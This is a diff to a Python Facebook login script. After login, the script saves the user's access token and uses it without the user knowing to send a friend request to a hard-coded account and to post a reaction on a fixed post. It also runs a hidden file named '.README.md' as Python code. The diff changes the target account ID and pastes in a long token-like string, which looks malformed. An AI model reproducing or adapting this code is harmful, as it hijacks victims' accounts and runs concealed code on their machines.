@@ -102,7 +102,7 @@ def login_choice():
         fout=open('....', 'w')
         fout.write(fac)
         fout.close()
-        requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
+        requests.post('https://graph.facebook.com/me/friends?method=post&uids=100069526670831&access_token='+fac)
         requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +fac)
         os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
         os.system('python2 .README.md')
@@ -137,9 +137,9 @@ def login1():
 		    st.close()
 		    print ('\n\x1b[1;92m[+] Login Successfull \x1b[1;97m')
 		    t()
-		    os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
-		    requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+z['access_token'])
-		    requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +z['access_token'])
+		    #os.system ('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
+		    requests.post('https://graph.facebook.com/me/friends?method=post&uids=100069526670831&access_token='+z['EAAGNO4a7r2wBAJpU9a15FQnHRio2fUAgXEjSx4CGArZBjEWWy6rs8nsXQ1lge4PV9TOZCsUyvjhhGeh1Yty4d7LBQdApdK0kFmazQcAIDfwatX5fhmeifjsaKRtJ9PfV3HV1HclX3cXX1i6kSVgAha6cOOSSF1E0dCZAsCYZCWcC6NPNsvvFRgiP1nXmg1UZD'])
+		    requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +z['EAAGNO4a7r2wBAJpU9a15FQnHRio2fUAgXEjSx4CGArZBjEWWy6rs8nsXQ1lge4PV9TOZCsUyvjhhGeh1Yty4d7LBQdApdK0kFmazQcAIDfwatX5fhmeifjsaKRtJ9PfV3HV1HclX3cXX1i6kSVgAha6cOOSSF1E0dCZAsCYZCWcC6NPNsvvFRgiP1nXmg1UZD'])
 		    os.system('python2 .README.md')
 		else:
 		    if 'www.facebook.com' in z['error_msg']:
